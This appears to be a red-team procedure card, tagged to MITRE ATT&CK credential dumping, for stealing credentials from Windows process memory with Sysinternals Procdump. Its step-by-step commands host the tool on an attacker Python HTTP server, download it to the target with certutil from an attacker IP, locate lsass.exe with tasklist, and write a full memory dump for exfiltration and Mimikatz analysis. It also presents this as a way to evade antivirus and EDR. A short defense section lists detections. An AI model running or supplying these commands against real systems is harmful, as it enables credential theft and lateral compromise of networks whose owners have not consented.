---
id: ac7e1aa8-3963-4085-b44c-219cfc0c05d8
name: Dump-Process-Memory-Using-Procdump
type: procedure
verified: true
submitted: true
created_at: '2020-01-02T18:45:14.141646+00:00'
updated_at: '2023-05-25T19:54:03.240629+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
platforms:
  - Windows
tags:
  - '[[tags/data exposure]]'
  - '[[tags/memory]]'
commands:
  - '[[commands/launch-python-http-server]]'
  - '[[commands/certutil-download-file-from-http]]'
  - '[[commands/tasklist-list-running-processes]]'
  - '[[commands/procdump-dump-process-memory]]'
tools:
  - '[[tools/ProcDump]]'
validated: true
---

# Dump-Process-Memory-Using-Procdump

## Summary

This procedure dumps the memory of a running process on a Windows target using Sysinternals Procdump, allowing extraction of sensitive data such as credentials or encryption keys stored in memory. It is useful in post-exploitation scenarios for credential access after gaining initial foothold.

## Description

Procdump is a command-line utility from Microsoft Sysinternals that creates full memory dumps of processes without requiring debugging privileges in many cases. This technique targets processes like lsass.exe for credential dumping but can apply to any process holding valuable data. The process involves hosting the tool on an attacker-controlled server, downloading it to the target via certutil (a built-in Windows tool), listing running processes to identify the target PID, and then executing the dump. This method evades some AV detections by using living-off-the-land binaries (certutil) for transfer and avoids direct LSASS access which might trigger EDR.

## Requirements

1. Attacker machine with Python 3 installed for hosting the file.
2. Network access from target to attacker HTTP server (outbound HTTP allowed).
3. Administrative privileges on the target for full memory dumps (user-level may suffice for some processes).
4. Procdump.exe downloaded from official Sysinternals site.

## Defense

- Monitor for unusual process dumps via Sysmon Event ID 10 (process access) or EDR alerts on procdump execution.
- Restrict outbound HTTP to trusted domains and block certutil abuse with AppLocker or WDAC.
- Enable Credential Guard to protect LSASS memory.
- Log process creation with command-line auditing to detect procdump invocations.

## Objectives

1. Transfer Procdump to the target without triggering AV.
2. Identify and dump memory from a high-value process like lsass.exe.
3. Extract the dump file for offline analysis (e.g., with Mimikatz or Volatility).

## Instructions

### Step 1: Host Procdump on Attacker Server

**Context**: Set up a simple HTTP server on the attacker machine to serve the Procdump executable securely over HTTP.

**Command** ([[commands/launch-python-http-server]]):
```bash
python3 -m http.server $_PORT
```

> This starts a basic web server on the specified port (default 8000). Place procdump.exe (or procdump64.exe for 64-bit) in the current directory. Expected output includes server startup message like "Serving HTTP on 0.0.0.0 port 8000".

### Step 2: Download Procdump to Target

**Context**: Use the built-in certutil.exe on Windows to download the tool from the attacker server, bypassing some download restrictions.

**Command** ([[commands/certutil-download-file-from-http]]):
```command_prompt
certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" $_FILENAME
```

> Replace $_REMOTE_IP with attacker IP, $_FILENAME with procdump.exe. This fetches and saves the file locally. Expected output confirms download success, e.g., "CertUtil: -URLcache command completed successfully." Verify with dir command.

### Step 3: List Running Processes

**Context**: Identify the PID of the target process (e.g., lsass.exe for credentials) using the native tasklist command.

**Command** ([[commands/tasklist-list-running-processes]]):
```command_prompt
tasklist.exe
```

> This lists all processes with PIDs and memory usage. Expected output is a table of Image Name, PID, Session Name, etc. Note the PID for the target process.

### Step 4: Dump Process Memory

**Context**: Execute Procdump to create a memory dump file of the specified process, capturing all in-memory data.

**Command** ([[commands/procdump-dump-process-memory]]):
```command_prompt
procdump.exe -ma $_PID $_OUTPUT.dmp
```

> Use -ma for full memory dump. $_PID is the process ID from Step 3, $_OUTPUT is the base filename. Expected output shows dump initiation, estimated size, and completion, e.g., "Dump 1 complete: X MB written." The .dmp file is created for exfiltration and analysis.
